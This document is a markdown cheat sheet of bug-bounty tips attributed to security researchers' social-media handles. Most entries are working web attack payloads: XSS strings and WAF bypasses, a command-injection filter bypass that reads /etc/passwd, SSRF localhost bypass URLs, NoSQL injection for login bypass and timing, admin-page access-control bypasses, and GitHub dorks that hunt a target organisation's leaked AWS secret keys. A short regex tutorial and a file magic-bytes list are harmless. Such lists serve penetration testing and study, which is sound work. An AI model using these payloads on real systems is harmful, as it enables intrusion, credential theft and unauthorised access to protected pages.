## Universal injection / from @theXSSrat

```
‘“`<u>blab${7*7} 
into every field you see to test for 
- SQLi
- js XSS
- html attribute xss
- HTMLi XSS
- SSTI
```

## RCE bypass / from @pikpikcu

```
GET /?cc=cat+/etc/passwd

403 Forbidden

GET /?cc=/???/??t+/???/??ss??

200
root:x:0:0:root...

Done bypass firewall
```

## Learn Regex in 4 tweets / from @s0md3v
```
cat matches cat
ca+t matches caaaaaaaaaaaat but not ct
ca*t matches caaaaaaaaaaaat and also ct
ca{2,4} matches caat, caaat and caaaat
c(at)+ matches catatatatatat
c(at|orn) matches cat and corn
c[ea]t matches cat and cet
c[ea]+t matches caaaat and ceeet
c[A-C0-9]t matches cAt, cBt, cCt, c8t etc.
c.t matches cat, c&t, c2t (any char between c and t)
c.+t matches c3%x4t (any number of any chars)
c.*t matches c3%x4t and as well as ct
^ denotes start of a string, $ denotes the end
^a+cat will match aaacat in aaacat but not in bbaaacat
cat$ will match cat in aaacat but not in aaacats
^cat$ will match only and only this string i.e. cat

\d is for digits, \w for alphanumeric chars, \s is for white space chars & line breaks
\D is for non-digits, \W for non-alphamueric chars and \s is for non-white space chars
\t for tabs, \r for carriage return and \n for newline

Yes, c\d+t matches c2784t
Yes, c\s+ matches c       t
Yes, c\D+ matches cxxxt ca2t 

Using .*w vs .*?w on xxsomethingnew@1234wxx
.*w returns somethingnew@1234w (longest match)
.*w? returns somethingnew (shortest match)
```

## Tiny XSS payloads / from @terjanq
```
<x/oncut=alert(1)>a
<svg/onload=eval(name)>
<iframe/onload=write(URL)>
<svg/onload=eval(`'`+URL)>
<svg/onload=location=name>
<iframe/onload=src=top.name>
<iframe/onload=eval('`'+URL)>
<style/onload=eval(name)>
<style/onload=write(URL)>
<style/onload=eval(`'`+URL)>
<style/onerror=eval(name)>
<script/src=//⑮.₨><script>
```

## SSRF Bypass list for localhost (127.0.0.1) / from @LooseSecurity
```
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
http://localhost.me
http://localhost.nip.io
```

##  Github dorks / from @hunter0x7
```bash
org:Target "bucket_name"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "S3_BUCKET"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_SECRET_ACCESS_KEY"
org:Target "S3_ENDPOINT"
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
```


## Bypass admin page / from @hunter0x7
```
GET /admin HTTP/1.1
Host: http://site.com
...
Access is denied

GET /test HTTP/1.1
Host: http://site.com
X-Original-URL: /admin

HTTP/1.1 200 OK
```

## Bypass /admin / from @secoceans
```
/admin -> not allowed
/%61dmin -> allowed
```

## CSS XSS payload / from @hunter0x7
```css
img{background-image:url('javascript:alert()')}
```

## Bypass WAF (Firefox) / from @lutfumertceylan

```html
<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=prompt;throw 1;">
```

# Payloads for NoSQL Injection / from @e11i0t_4lders0n

```
true, $where: '1 == 1'

, $where: '1 == 1'

$where: '1 == 1'

', $where: '1 == 1

1, $where: '1 == 1'

{ $ne: 1 }

', $or: [ {}, { 'a':'a

' } ], $comment:'successful MongoDB injection'

db.injection.insert({success:1});

db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1

|| 1==1

|| 1==1//

|| 1==1%00

}, { password : /.*/ }

' && this.password.match(/.*/)//+%00

' && this.passwordzz.match(/.*/)//+%00

'%20%26%26%20this.password.match(/.*/)//+%00

';sleep(5000);

';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);

{"username": {"$ne": null}, "password": {"$ne": null}}

{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}

{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
```

## Using destructuring and window.error / from @garethheyes

```
<script>
[onerror]=[alert];throw 1
</script>

<script>
const{onerror}=alert;throw 1
</script>

<script>
var{a:onerror}={a:alert};throw 1
</script>

<svg onload=throw[onerror]=[alert],1> works on Safari because onerror doesn’t exist on the SVG
```

## Useful / easy to learn file magic bytes / from @SecGus

```
GIF - GIF89a
PDF - %PDF-
JPEG - \xff\xd8\xff\xdb
XML - <?xml
ELF - \x7FELF

Honorable mention for having cool magic bytes:
Java Class - CA FE BA BE
Email Message var5 - Received:
Preferred Executable Format - Joy!
Zoo - Z00
```

## If you run a bruteforce and notice weird behaviours - like "/admin/" redirecting to "/" / from @nnwakelam

```
/admin/
/admin/../admin
//admin/
/Admin/
/admin;/
/Admin;/
/index.php/admin/
/admin/js/*.js
/admin/*brute*.ext
/admin../admin
//anything/admin/
```

# JS hieroglyphs / Source https://aem1k.com/aurebesh.js

```
𓅂='',𓂀=!𓅂+𓅂,𓁄=!𓂀+𓅂,𓊎=𓅂+{},𓆣=𓂀[𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢],𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[𓇎]+𓂀[𓏢]+𓊝+𓆣+"(𓅂)")()
```

## Bypass Firewall / From @sec715

```
GET /?cc=cat+/etc/passwd

403 Forbidden

GET /?cc=/???/??t+/???/??ss??

200
root:x:0:0:root...
```